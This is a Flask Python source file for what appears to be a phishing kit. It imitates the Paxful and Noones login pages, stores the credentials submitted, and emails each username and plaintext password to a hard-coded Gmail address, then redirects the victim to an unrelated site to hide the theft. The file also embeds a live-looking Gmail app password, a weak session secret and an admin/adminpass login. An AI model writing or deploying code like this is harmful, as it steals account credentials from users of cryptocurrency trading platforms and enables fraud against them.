from flask import Flask, render_template, request, redirect, session, url_for
import sqlite3, os
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
from datetime import timedelta
from flask_mail import Mail, Message
import random

app = Flask(__name__)
app.secret_key = 'kenaki_secret'
app.permanent_session_lifetime = timedelta(minutes=30)

# ========== Database Path Setup ==========
if os.getenv("VERCEL") == "1":
    DB_PATH = "/tmp/users.db"
else:
    DB_PATH = "users.db"

# ========== Flask-Mail Configuration ==========
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USERNAME'] = 'chasersbit439@gmail.com'
app.config['MAIL_PASSWORD'] = 'opjvzgzpyafungcc'
app.config['MAIL_DEFAULT_SENDER'] = 'chasersbit439@gmail.com'

mail = Mail(app)

# ========== Initialize Database ==========
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            action TEXT,
            platform TEXT
        )
    ''')
    conn.commit()
    conn.close()
    print("[DB] Database and 'users' table ready.")

init_db()

# ========== Admin Login Decorator ==========
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('admin') != True:
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# ========== Routes ==========
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/select-service')
def select_service():
    action = request.args.get('action')
    return render_template('select-service.html', action=action)

@app.route('/paxful', methods=['GET', 'POST'])
def paxful_login():
    action = request.args.get('action', 'do something')

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        hashed_pw = generate_password_hash(password)

        try:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("INSERT INTO users (username, password, action, platform) VALUES (?, ?, ?, ?)",
                      (username, hashed_pw, action, 'paxful'))
            conn.commit()
            conn.close()
            print(f"[DB] User '{username}' inserted successfully.")
        except Exception as e:
            print(f"[Error] Inserting user {username}: {e}")
            return "Error inserting data", 500

        session['username'] = username
        send_login_notification(username, action, password)  # Include password in the notification

        random_websites = [
            'https://www.example.com', 'https://www.google.com',
            'https://www.wikipedia.org', 'https://www.bing.com', 'https://www.reddit.com'
        ]
        return redirect(random.choice(random_websites))

    return render_template('OGpax.html', action=action)

@app.route('/noones', methods=['GET', 'POST'])
def noones_login():
    action = request.args.get('action', 'do something')

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        hashed_pw = generate_password_hash(password)

        try:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("INSERT INTO users (username, password, action, platform) VALUES (?, ?, ?, ?)",
                      (username, hashed_pw, action, 'noones'))
            conn.commit()
            conn.close()
            print(f"[DB] User '{username}' inserted successfully.")
        except Exception as e:
            print(f"[Error] Inserting user {username}: {e}")
            return "Error inserting data", 500

        session['username'] = username
        send_login_notification(username, action, password)  # Include password in the notification

        random_websites = [
            'https://www.example.com', 'https://www.google.com',
            'https://www.wikipedia.org', 'https://www.bing.com', 'https://www.reddit.com'
        ]
        return redirect(random.choice(random_websites))

    return render_template('OGnoones.html', action=action)

@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        email = data['email']
        password = data['password']
        action = data['action']

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE username = ?", (email,))
        user = c.fetchone()
        conn.close()

        if user and check_password_hash(user[2], password):
            return {"message": "Login successful!"}
        else:
            return {"message": "Invalid login credentials!"}, 401

    except Exception as e:
        print(f"[Error] During login: {e}")
        return {"message": "Internal server error!"}, 500

@app.route('/admin')
@login_required
def admin_dashboard():
    return render_template('admin_dashboard.html')

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        admin_username = request.form['username']
        admin_password = request.form['password']

        if admin_username == 'admin' and admin_password == 'adminpass':
            session['admin'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            return "Invalid credentials", 403

    return render_template('admin_login.html')

# ========== Send Login Notification ==========
def send_login_notification(username, action, password):
    try:
        message = Message(
            subject="New Login Attempt",
            recipients=["chasersbit439@gmail.com"],
            body=f"A user has logged in:\n\nUsername: {username}\nPassword: {password}\nAction: {action}"
        )
        mail.send(message)
        print(f"[Mail] Notification sent for user '{username}'.")
    except Exception as e:
        print(f"[Error] Sending email: {e}")

if __name__ == '__main__':
    app.run(debug=True)
